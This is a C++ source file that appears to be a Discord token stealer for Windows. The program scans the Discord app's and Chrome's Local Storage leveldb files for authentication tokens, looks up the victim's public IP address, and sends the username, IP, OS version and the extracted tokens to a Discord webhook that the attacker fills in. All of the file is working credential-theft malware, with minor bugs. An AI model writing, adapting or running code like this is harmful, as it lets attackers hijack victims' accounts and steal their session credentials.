#include <iostream>
#include <fstream>
#include <Windows.h>
#include <Wininet.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "wininet.lib")

class DcWebHook {
private:
    HINTERNET hInternet;
    HINTERNET hConnect;

public:
    std::string WebHook;
    std::string UserName;
    std::string ProfilePicture;

    DcWebHook() {
        hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    }

    void SendMessage(const std::string& msgSend) {
        hConnect = InternetOpenUrlA(hInternet, WebHook.c_str(), NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
        
        if (hConnect) {
            std::string post_data = "username=" + UserName + "&avatar_url=" + ProfilePicture + "&content=" + msgSend;
            DWORD post_data_size = static_cast<DWORD>(post_data.size());

            HttpSendRequestA(hConnect, NULL, 0, (LPVOID)post_data.c_str(), post_data_size);
            InternetCloseHandle(hConnect);
        }
    }

    ~DcWebHook() {
        InternetCloseHandle(hInternet);
    }
};

std::string GetIPAddress() {
    HINTERNET hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://ipv4bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hConnect) {
        char ip_address[16];
        DWORD bytesRead;
        InternetReadFile(hConnect, ip_address, sizeof(ip_address), &bytesRead);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        if (bytesRead > 0) {
            ip_address[bytesRead] = '\0';
            return ip_address;
        }
    }

    return "N/A";
}

bool dotlog(std::string& path) {
    if (path.empty() || !PathIsDirectoryA(path.c_str())) {
        return false;
    }

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((path + "\\*.*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    do {
        if (strstr(findFileData.cFileName, ".log")) {
            std::string filePath = path + "\\" + findFileData.cFileName;
            std::ifstream file(filePath.c_str());

            if (file.is_open()) {
                std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                if (fileContents.find("oken") != std::string::npos) {
                    path = filePath;
                    FindClose(hFind);
                    return true;
                }

                file.close();
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
    return false;
}

std::string tokenx(const std::string& path, bool boolx = false) {
    if (path.empty() || !PathFileExistsA(path.c_str())) {
        return "";
    }

    std::ifstream file(path.c_str());

    if (file.is_open()) {
        std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        std::string token;

        size_t pos = fileContents.find("oken");
        while (pos != std::string::npos) {
            size_t start = fileContents.rfind("\"", pos);
            if (start != std::string::npos) {
                size_t end = fileContents.find("\"", pos);
                if (end != std::string::npos && end - start == 58) {
                    token = fileContents.substr(start + 1, end - start - 1);
                    if (boolx) break;
                }
            }
            pos = fileContents.find("oken", pos + 4);
        }

        file.close();
        return token;
    }

    return "";
}

bool dotldb(std::string& path) {
    if (path.empty() || !PathIsDirectoryA(path.c_str())) {
        return false;
    }

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((path + "\\*.*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    do {
        if (strstr(findFileData.cFileName, ".ldb")) {
            std::string filePath = path + "\\" + findFileData.cFileName;
            std::ifstream file(filePath.c_str());

            if (file.is_open()) {
                std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                if (fileContents.find("oken") != std::string::npos) {
                    path = filePath;
                    FindClose(hFind);
                    return true;
                }

                file.close();
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
    return false;
}

int main() {
    std::string string1 = std::string(getenv("APPDATA")) + "\\discord\\Local Storage\\leveldb\\";
    if (!dotldb(string1) && !dotldb(string1)) {
        // Do nothing
    }

    Sleep(100);

    std::string string2 = tokenx(string1, string1.ends_with(".log"));
    if (string2.empty()) {
        string2 = "N/A";
    }

    std::string string3 = std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
    if (!dotldb(string3) && !dotlog(string3)) {
        // Do nothing
    }

    Sleep(100);

    std::string string4 = tokenx(string3, string3.ends_with(".log"));
    if (string4.empty()) {
        string4 = "N/A";
    }

    // Sending message to Discord webhook
    DcWebHook dcWeb;
    dcWeb.UserName = "Webhook";
    dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
    dcWeb.WebHook = "YOURDISCORDWEBHOOK LINK";

    std::string osName;
    OSVERSIONINFOEX osVersionInfo;
    osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if (GetVersionEx(reinterpret_cast<OSVERSIONINFO*>(&osVersionInfo))) {
        osName = osVersionInfo.szCSDVersion;
    }

    dcWeb.SendMessage("```\nUserName: " + std::string(getenv("USERNAME")) + "\nIP: " + GetIPAddress() + "\nOS: " + osName + "\nToken DiscordAPP: " + string2 + "\nToken Chrome: " + string4 + "\n```");

    return 0;
}
